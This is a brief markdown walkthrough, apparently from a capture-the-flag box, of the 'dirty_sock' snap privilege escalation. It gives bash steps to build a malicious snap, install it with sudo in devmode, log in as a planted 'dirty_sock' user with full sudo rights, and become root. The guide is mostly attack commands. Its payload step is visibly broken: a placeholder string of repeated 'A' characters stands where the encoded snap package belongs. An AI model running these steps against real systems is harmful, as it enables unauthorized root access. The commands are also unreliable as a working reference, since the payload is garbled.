# Snap Dirty-Sock Privilege Escalation Exploit

**Disclaimer:**  
This guide is for **educational purposes only**. Unauthorized access or testing is **illegal**. Use only in authorized environments with proper permission.

## Exploit Steps

```bash
# 1. Navigate to the user folder
cd /home/<user>

# 2. Create the exploit package
python -c 'print "" + "A"*4256 + "=="' | base64 -d > hack.snap

# 3. Install the malicious Snap package
sudo /usr/bin/snap install --devmode hack.snap
# Output: dirty-sock 0.1 installed

# 4. Verify the user in /etc/passwd
tail /etc/passwd

# 5. Switch to the new user (password is the same as the username: dirty_sock)
su dirty_sock

# 6. Check sudo permissions
sudo -l
# Output: User dirty_sock may run the following commands on armageddon: (ALL : ALL) ALL

# 7. Elevate to root
sudo -i
```

ðŸŽ‰ ** Now have root privileges.**
